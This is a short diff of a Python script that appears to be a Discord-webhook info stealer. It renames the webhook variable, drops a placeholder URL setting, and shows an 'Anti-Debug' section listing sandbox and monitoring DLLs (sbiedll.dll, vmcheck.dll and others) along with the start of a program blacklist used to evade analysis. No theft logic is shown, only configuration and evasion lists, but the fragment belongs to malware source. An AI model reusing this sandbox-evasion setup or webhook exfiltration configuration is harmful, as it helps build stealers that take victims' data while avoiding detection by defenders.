@@ -54,7 +54,7 @@ from requests import get
 
 
 
-webhook = 'DISCORD_WEBHOOK_URL'
+api = 'DISCORD_WEBHOOK_URL'
 server_id = "DISCORD_SERVER_ID"
 g = [int(server_id)]
 
@@ -64,8 +64,6 @@ os.system("cls")
 #region Anti-Debug
 
 #region Config
-
-api = "URL_HERE"
 
 sandboxDLLs = ["sbiedll.dll","api_log.dll","dir_watch.dll","pstorec.dll","vmcheck.dll","wpespy.dll"]
 program_blacklist = [
